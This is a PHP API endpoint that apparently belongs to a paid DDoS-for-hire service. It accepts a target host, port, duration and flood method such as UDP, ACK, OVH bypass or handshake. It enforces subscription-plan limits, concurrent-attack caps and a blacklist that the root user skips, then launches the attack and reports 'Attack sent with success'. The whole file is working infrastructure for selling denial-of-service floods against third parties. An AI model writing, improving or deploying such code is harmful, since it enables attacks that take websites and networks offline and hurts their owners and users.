<?php
header('Content-type: application/json');

// Define valid attack methods
$attackMethods = ['https', 'tcp', 'ovh', 'handshake', 'udpplain', 'ack', 'mixamp'];

// Check if all required parameters are present
if (!isset($_GET["key"]) || !isset($_GET["username"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["time"]) || !isset($_GET["method"])) {
    throwError("You are missing a parameter");
}

// retrieve input parameters
$key = $_GET["key"];
$username = $_GET["username"];
$host = $_GET["host"];
$port = (int)$_GET["port"];
$method = strtolower($_GET["method"]);
$time = (int)$_GET["time"];

if (API_MAINTENANCE && $username != "root") {
    throwError("API under maintenance");
}

if (API_COOLDOWN_ENABLED && $username != "root") {
    RateLimit::checkRequestLimit($username);
}

if (!is_int($port) || $port < 1 || $port > 65535) {
    throwError("Invalid 'port' parameter. Please provide a valid value between 1 and 65535");
}

if (!filter_var($host, FILTER_VALIDATE_IP) && !filter_var($host, FILTER_VALIDATE_URL)) {
    throwError("Invalid 'host' parameter. Please provide a valid website URL or IP address.");
}

if (!is_int($time) || $time < 30) {
    throwError("Invalid 'time' parameter. Please provide a valid value of at least 30 seconds.");
}

/**
 * Check if the provided API key is valid for a given username.
 *
 * @param string $key The API key to validate.
 * @param string $username The username associated with the API key.
 *
 * @return bool True if the API key is valid, false otherwise.
 */
if (!User::isApiKeyValid($key, $username)) {
    throwError("Invalid API key. Please provide a valid API key to access this service.");
}

/**
 * Check if the provided attack method is valid.
 *
 * @param string $method The attack method to validate.
 * @param array $attackMethods An array of valid attack methods.
 *
 * @return bool True if the attack method is valid, false otherwise.
 */
if (!in_array($method, $attackMethods)) {
    $validMethods = implode(', ', $attackMethods);
    throwError("Invalid attack method. Valid methods are: $validMethods");
}

/**
 * Verify if the host is blacklisted.
 *
 * @param string $host The host to check against the blacklist.
 *
 * @return bool True if the host is blacklisted, false otherwise.
 */
if (Blacklist::verify($host) && $username != "root") {
    throwError("This host is blacklisted");
}

/**
 * Get the attack limit for a user's plan and check if it has been reached.
 *
 * @param string $username The username for which to check the attack limit.
 */
$planLimit = Plan::getPlanLimit(User::getPlan($username));

Plan::updatePlan("home", 3600, 1);

/**
 * Check if the user has exceeded the concurrent attack limit defined in their plan.
 *
 * @param string $username The username for which to check the concurrent attack limit.
 * @param array $planLimit The plan limit information.
 *
 * @return bool True if the concurrent attack limit has been exceeded, false otherwise.
 */
if (Attack::countAttackFromUser($username) >= $planLimit['concurrent'] && $username != "root") {
    throwError("The concurrent attack limit for your plan has been reached.");
}

/**
 * Check if the time limit for the user's plan has been exceeded.
 *
 * @param int $time The time duration in seconds to compare against the plan limit.
 * @param array $planLimit The plan limit information.
 *
 * @return bool True if the time limit has been exceeded, false otherwise.
 */
if ($time > $planLimit['time']) {
    throwError("The attack duration exceeds the allowed limit for this plan.");
}

/**
 * Check if there are available slots for launching an attack.
 *
 * @return bool True if there are available attack slots, false otherwise.
 */
if (Attack::hasAvailableSlots() && $username != "root") {
    throwError("No slots available to send your attack");
}

/**
 * Check if the host is currently under attack.
 *
 * @param string $host The host to check for ongoing attacks.
 *
 * @return bool True if the host is under attack, false otherwise.
 */
if (Attack::isAlreadyUnderAttack($host) && $username != "root") {
    throwError("Host is under attack");
}

Attack::addEntry($username, $host, $port, $time, $method, $planLimit['concurrent']);

$request = new RequestApi($host, $port, $time, $method);
$response = $request->launch();

if ($username == "root" && $_GET['debug'] == 1) {
    echo json_encode($response);
    exit;
}

$resultData["error"] =  false;
$resultData["reason"] = "Attack sent with success";

/**
 * Encode the error response array as a JSON response.
 */
echo json_encode($resultData);